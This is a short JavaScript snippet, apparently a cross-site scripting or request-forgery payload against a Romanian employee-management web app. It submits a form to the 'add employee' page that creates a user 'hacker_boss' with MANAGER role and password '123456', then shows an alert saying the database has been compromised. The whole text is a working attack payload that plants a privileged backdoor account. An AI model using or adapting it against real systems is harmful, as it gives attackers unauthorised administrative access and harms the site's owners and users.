var f = new FormData();
f.append('username', 'hacker_boss');
f.append('parola', '123456');
f.append('nume', 'Inamicul');
f.append('prenume', 'Suprem');
f.append('role', 'MANAGER');
f.append('departament', 'IT');
f.append('salariu', '9999');

fetch('?page=adauga_angajat', {
    method: 'POST',
    body: f
}).then(function(response) {
    alert('Baza de date a fost compromisa! S-a creat un cont nou de MANAGER.');
}).catch(function(error) {
    console.error(error);
});
